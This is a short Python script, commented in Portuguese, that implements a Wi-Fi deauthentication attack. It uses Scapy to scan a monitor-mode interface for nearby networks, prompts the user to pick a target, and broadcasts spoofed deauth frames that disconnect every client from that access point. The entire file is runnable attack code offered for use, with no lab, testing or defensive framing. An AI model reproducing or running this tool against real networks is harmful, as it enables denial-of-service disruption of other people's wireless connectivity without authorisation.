
# Wi-Fi Deauther

# Importando as Bibliotecas
from scapy.all import *
import os
from scapy.layers.dot11 import Dot11, Dot11Elt, Dot11Beacon, Dot11Deauth


# Função para obter todas as redes
def get_wifi_networks(interface="wlan0mon"):
    networks = []
    scan_result = []

    try:
        print(f"[+] Escaneando na interface {interface} por 10 segundos...")
        scan_result = sniff(iface=interface, timeout=10, prn=lambda x: x.summary(), store=True)
    except KeyboardInterrupt:
        pass

    for packet in scan_result:
        if packet.haslayer(Dot11Beacon):
            essid = packet[Dot11Elt].info.decode(errors="ignore")
            bssid = packet[Dot11].addr3

            if (essid, bssid) not in networks:
                networks.append((essid, bssid))
    return networks


# Função para enviar pacotes de deauth
def deauth_all_devices(target_bssid, iface="wlan0mon"):
    deauth_packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff",
                                       addr2=target_bssid,
                                       addr3=target_bssid) / Dot11Deauth()
    print(f"[+] Enviando pacotes de deauth na BSSID {target_bssid}...")
    sendp(deauth_packet, iface=iface, count=100, inter=0.1, verbose=False)


# Execução principal
if __name__ == '__main__':
    interface = "wlan0mon"
    wifi_networks = get_wifi_networks(interface)

    if wifi_networks:
        os.system('clear')
        print("Redes Wi-Fi encontradas:")
        for idx, (essid, bssid) in enumerate(wifi_networks, start=1):
            print(f"{idx}. ESSID: {essid} | BSSID: {bssid}")

        try:
            selected_option = int(input("\nDigite o número da rede alvo para ataque de deauth: "))
            if 1 <= selected_option <= len(wifi_networks):
                selected_bssid = wifi_networks[selected_option - 1][1]
                deauth_all_devices(selected_bssid, interface)
                print("[✓] Pacotes de deauth enviados com sucesso.")
            else:
                print("[!] Opção inválida.")
        except ValueError:
            print("[!] Entrada inválida. Digite um número.")
    else:
        print("[!] Nenhuma rede Wi-Fi encontrada.")
